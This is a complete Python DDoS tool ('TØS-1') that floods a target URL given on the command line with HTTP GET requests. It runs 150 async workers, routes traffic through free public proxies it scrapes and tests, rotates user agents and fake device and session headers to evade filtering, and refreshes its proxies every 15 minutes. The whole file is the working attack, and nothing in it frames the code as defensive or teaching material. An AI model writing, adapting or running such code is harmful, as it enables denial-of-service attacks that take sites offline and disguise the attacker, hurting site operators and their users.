import asyncio
import aiohttp
import time
import random
import os
import sys
from datetime import datetime

class TOS1_DEMON:
    def __init__(self, target_url):
        self.target_url = target_url
        self.total_requests = 0
        self.session_id = "S023"
        self.demon_id = "TØS-RR"
        self.maintenance_status = ""
        
        # PROXY SYSTEM - ONLY WORKING
        self.working_proxies = []
        self.proxy_api = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=2000&country=all"
        
        # USER AGENTS FROM FILE
        self.user_agents = self.load_user_agents()
        if not self.user_agents:
            self.user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
            ]
        
        # ROTATION SYSTEMS
        self.device_ids = ['550e8400-e29b-41d4-a716-446655440000', '6ba7b810-9dad-11d1-80b4-00c04fd430c8']
        self.session_ids = []
        self.generate_new_ids()
        
        # CONTROL
        self.running = True
        self.maintenance_mode = False
        self.last_maintenance = time.time()
        self.maintenance_interval = 900  # 15 minutes
        self.attack_started = False
        
        # STATS
        self.start_time = time.time()
        self.proxy_fetch_start = time.time()
        self.current_rps = 0
        self.requests_since_last = 0
        self.last_rps_calc = time.time()
        
        # ASYNC
        self.session = None
        self.loop = None
        
    def load_user_agents(self):
        """Load user agents from ua.txt"""
        if os.path.exists('ua.txt'):
            try:
                with open('ua.txt', 'r') as f:
                    agents = [line.strip() for line in f if line.strip()]
                    return agents
            except:
                pass
        return []
    
    def generate_new_ids(self):
        """Generate new session IDs"""
        self.session_ids = [f"session_{random.randint(1000000000, 9999999999)}" for _ in range(10)]
    
    async def fetch_proxies_from_api(self):
        """Fetch fresh proxies from API"""
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=5)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(self.proxy_api) as response:
                    if response.status == 200:
                        text = await response.text()
                        proxies = [p.strip() for p in text.split('\n') if p.strip()]
                        return proxies[:1000]  # Limit to 1000
        except:
            pass
        return []
    
    async def test_proxy_fast(self, proxy, test_session):
        """Quick proxy test"""
        try:
            async with test_session.get(
                self.target_url,
                proxy=f"http://{proxy}",
                timeout=aiohttp.ClientTimeout(total=1.5),
                ssl=False
            ) as response:
                if response.status < 500:
                    return proxy
        except:
            pass
        return None
    
    async def find_working_proxies(self, countdown=60):
        """Find working proxies during countdown timer"""
        print(f"\n[~] Finding working proxies ({countdown}s timer)...")
        
        # Fetch fresh proxies
        raw_proxies = await self.fetch_proxies_from_api()
        if not raw_proxies:
            print("[!] No proxies from API, using direct")
            self.working_proxies = [None]
            return
        
        print(f"[+] Fetched {len(raw_proxies)} proxies, testing...")
        
        # Test proxies during countdown
        test_start = time.time()
        working = []
        
        # Create test session
        connector = aiohttp.TCPConnector(limit=50, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as test_session:
            # Test in batches
            batch_size = 100
            tested = 0
            
            while time.time() - test_start < countdown and tested < len(raw_proxies):
                # Get next batch
                end_idx = min(tested + batch_size, len(raw_proxies))
                batch = raw_proxies[tested:end_idx]
                
                # Test batch concurrently
                tasks = []
                for proxy in batch:
                    task = asyncio.create_task(self.test_proxy_fast(proxy, test_session))
                    tasks.append(task)
                
                # Wait for batch results (max 2 seconds per batch)
                done, pending = await asyncio.wait(tasks, timeout=2.0)
                
                # Collect working proxies
                for task in done:
                    try:
                        result = await task
                        if result:
                            working.append(result)
                    except:
                        pass
                
                # Cancel pending
                for task in pending:
                    task.cancel()
                
                tested += len(batch)
                
                # Update progress
                elapsed = time.time() - test_start
                remaining = max(0, countdown - elapsed)
                print(f"\r[~] Tested {tested}/{len(raw_proxies)} | Working: {len(working)} | Time left: {remaining:.0f}s", end="")
        
        print()
        self.working_proxies = working if working else [None]
        print(f"[+] Found {len(self.working_proxies)} working proxies")
    
    def get_random_proxy(self):
        """Get random working proxy"""
        if not self.working_proxies:
            return None
        
        proxy = random.choice(self.working_proxies)
        return f"http://{proxy}" if proxy else None
    
    def get_random_headers(self):
        """Generate random realistic headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        }
        
        # Randomly add device/session IDs
        if random.random() > 0.3:
            headers['X-Device-ID'] = random.choice(self.device_ids)
        if random.random() > 0.3 and self.session_ids:
            headers['X-Session-ID'] = random.choice(self.session_ids)
        
        return headers
    
    async def send_request(self):
        """Send single request"""
        proxy = self.get_random_proxy()
        headers = self.get_random_headers()
        
        try:
            if proxy:
                async with self.session.get(
                    self.target_url,
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=2),
                    ssl=False
                ) as response:
                    await response.read()
            else:
                async with self.session.get(
                    self.target_url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=2),
                    ssl=False
                ) as response:
                    await response.read()
                    
        except:
            pass
        finally:
            self.total_requests += 1
            self.requests_since_last += 1
    
    async def attack_worker(self):
        """Worker that sends requests as fast as possible"""
        while self.running and not self.maintenance_mode and self.attack_started:
            # Send multiple requests before yielding
            for _ in range(5):
                await self.send_request()
            await asyncio.sleep(0)  # Yield control
    
    def calculate_rps(self):
        """Calculate RPS"""
        now = time.time()
        time_diff = now - self.last_rps_calc
        
        if time_diff >= 0.001:  # Every millisecond
            self.current_rps = self.requests_since_last / time_diff
            self.requests_since_last = 0
            self.last_rps_calc = now
    
    def update_display(self):
        """Update display - ONLY THIS LOG"""
        self.calculate_rps()
        
        # Update maintenance status
        if self.maintenance_mode:
            self.maintenance_status = "TØS-MAINTENACE"
        else:
            time_left = self.maintenance_interval - (time.time() - self.last_maintenance)
            if time_left < 60:
                self.maintenance_status = f"M-{int(time_left)}s"
            else:
                self.maintenance_status = f"M-{int(time_left/60)}m"
        
        # OVERWRITE LOG EVERY MILLISECOND
        sys.stdout.write(f'\rTØS-TRS — {self.total_requests} | {{{self.session_id}, {self.demon_id}}}')
        sys.stdout.flush()
    
    async def maintenance(self):
        """15-minute maintenance"""
        self.maintenance_mode = True
        self.attack_started = False
        
        # Clear screen and show maintenance message
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
        print("[!] TØS-MAINTENACE - Refreshing everything...")
        
        # Refresh proxies
        await self.find_working_proxies(countdown=30)  # 30s during maintenance
        
        # Refresh IDs
        self.generate_new_ids()
        
        # Clear screen again
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
        
        print("[+] Maintenance complete - Resuming attack")
        self.maintenance_mode = False
        self.last_maintenance = time.time()
        self.attack_started = True
    
    async def maintenance_checker(self):
        """Check for maintenance every 15 minutes"""
        while self.running:
            if time.time() - self.last_maintenance >= self.maintenance_interval:
                await self.maintenance()
            await asyncio.sleep(1)
    
    async def display_updater(self):
        """Update display every millisecond"""
        while self.running:
            if self.attack_started:
                self.update_display()
            await asyncio.sleep(0.001)
    
    async def run(self):
        """Main execution"""
        # Initial display
        print("𝖳Ø𝖲-1 | 𝖲023")
        await asyncio.sleep(2)
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
        
        # 1-MINUTE COUNTDOWN TO FIND WORKING PROXIES
        print("[~] 1-minute proxy setup timer started")
        countdown_start = time.time()
        
        # Find working proxies during countdown
        await self.find_working_proxies(countdown=60)
        
        countdown_elapsed = time.time() - countdown_start
        if countdown_elapsed < 60:
            await asyncio.sleep(60 - countdown_elapsed)
        
        # Clear and start attack
        sys.stdout.write('\033[2J\033[H')
        sys.stdout.flush()
        
        print("[+] Attack starting with working proxies...")
        self.attack_started = True
        
        # Create main session
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        self.session = aiohttp.ClientSession(connector=connector)
        
        try:
            # Start attack workers
            workers = [asyncio.create_task(self.attack_worker()) for _ in range(150)]
            
            # Run everything
            await asyncio.gather(
                *workers,
                self.maintenance_checker(),
                self.display_updater(),
                return_exceptions=True
            )
            
        finally:
            await self.session.close()

def main():
    if len(sys.argv) != 2:
        print("Usage: python tos1.py https://target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Increase file limits
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (8192, 8192))
    except:
        pass
    
    # Create and run demon
    demon = TOS1_DEMON(target)
    
    try:
        asyncio.run(demon.run())
    except KeyboardInterrupt:
        runtime = time.time() - demon.start_time
        avg_rps = demon.total_requests / runtime if runtime > 0 else 0
        
        print(f"\n\n=== TØS-1 FINAL STATS ===")
        print(f"Total Requests: {demon.total_requests:,}")
        print(f"Average RPS: {avg_rps:,.1f}")
        print(f"Runtime: {runtime:.1f}s")
        print(f"Working Proxies: {len(demon.working_proxies)}")
        print("=" * 30)
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
